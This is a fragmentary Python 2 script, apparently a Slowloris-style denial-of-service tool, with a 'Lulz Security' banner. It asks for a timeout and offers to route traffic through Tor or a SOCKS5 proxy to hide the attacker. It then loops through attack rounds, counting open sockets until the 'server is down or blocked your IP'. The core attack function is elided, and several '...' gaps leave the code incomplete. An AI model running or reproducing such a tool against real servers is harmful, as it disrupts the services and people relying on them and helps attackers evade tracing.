...
print"""\033[92m
  ...
  this is Lulz Security's property 
...
socs=20
t=input('\n      TIMEOUT:\n      >')
x=input('\n      USE proxy?\n       1-Tor\n       2-Other(SOCKS5 Proxy)\n       3-no proxy\n      >')
if x==1: 
 try:
  import socks
  socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1', 9050)
 except AttributeError as e:
  print'\033[91m      [-]no proxy\n      ',e
 except ImportError:
  print'\033[91m      [-]no proxy\n      "socks" library is unavailable'
elif x==2:
 try:
  import socks
  pa=raw_input('\n      PROXY ADDRESS:\n      >')
  pp=input('      PROXY PORT:\n      >')
  socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, pa, pp)
 except AttributeError as e:
  print'\033[91m      [-]no proxy\n      ',e
 except ImportError:
  print'\033[91m      [-]no proxy\n      "socks" library is unavailable'
...
while True:
 i=i+1
 print'\033[92m  [+]round:',i
 g()
 print'              sockets alive:',len(ls)
 if len(ls)==0:
  print'server is down or blocked your IP!!!\n\n'
  break